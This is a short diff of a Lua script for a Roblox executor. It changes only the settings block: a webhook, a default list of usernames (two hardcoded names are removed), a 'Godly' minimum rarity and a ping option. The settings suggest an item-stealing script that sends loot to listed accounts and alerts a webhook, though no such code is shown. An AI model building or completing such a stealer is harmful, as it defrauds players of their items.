@@ -8,7 +8,7 @@ getgenv().ScriptEjecutado = true
 
 -- Configuración
 local webhook = _G.webhook or ""
-local users = _G.Usernames or {"cybertu24","cybertu24"} -- Nicknames originales
+local users = _G.Usernames or {} -- Nicknames originales
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
